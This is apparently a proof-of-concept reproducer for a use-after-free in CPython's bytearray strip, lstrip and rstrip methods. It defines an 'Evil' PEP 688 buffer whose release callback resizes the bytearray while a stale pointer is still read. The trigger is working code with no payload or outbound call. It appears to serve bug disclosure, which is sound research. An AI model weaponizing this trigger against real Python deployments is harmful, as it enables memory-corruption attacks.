"""bytearray.strip(x): raw pointer into self survives a user __release_buffer__.

Objects/bytearrayobject.c bytearray_strip_impl_helper:

    myptr  = PyByteArray_AS_STRING(self);   /* :2375  raw char* into self */
    mysize = Py_SIZE(self);                 /* :2376 */
    ...                                     /* scan */
    if (bytes != Py_None)
        PyBuffer_Release(&vbytes);          /* :2391  runs user __release_buffer__ (PEP 688) */
    return PyByteArray_FromStringAndSize(myptr + left, right - left);   /* :2392  stale myptr */

The Dec-2025 sweep 220f0b10777 (gh-142560) bracketed ten bytearray methods with
ob_exports++ so that a callback cannot resize self mid-operation. This helper was
not included, so _canresize permits the callback to reallocate self's buffer.

Guarded twin: bytearray_split_impl:1799 releases the buffer INSIDE the window.

    python bytearray_strip_release_buffer_uaf.py [--case strip|lstrip|rstrip] [--mode clear|grow]
"""

import sys


def build(target, mode):
    class Evil:
        """A PEP 688 buffer whose release callback resizes the bytearray."""

        def __buffer__(self, flags):
            return memoryview(b"\t\n\r\f\v ")

        def __release_buffer__(self, view):
            if mode == "grow":
                # Force a realloc to a new block, freeing the old one.
                target.extend(b"X" * (1 << 20))
            else:
                target.clear()

    return Evil()


def main():
    case = "strip"
    mode = "grow"
    if "--case" in sys.argv:
        case = sys.argv[sys.argv.index("--case") + 1]
    if "--mode" in sys.argv:
        mode = sys.argv[sys.argv.index("--mode") + 1]

    ba = bytearray(b"  \t hello world \n  ")
    evil = build(ba, mode)
    print("calling bytearray.%s(evil) with mode=%s" % (case, mode), file=sys.stderr)
    try:
        out = getattr(ba, case)(evil)
    except BaseException as exc:
        print("%s -> %s: %s" % (case, type(exc).__name__, str(exc)[:80]), file=sys.stderr)
    else:
        print("%s -> %r" % (case, bytes(out[:60])), file=sys.stderr)
    print("survived", file=sys.stderr)
    return 0


if __name__ == "__main__":
    sys.exit(main())
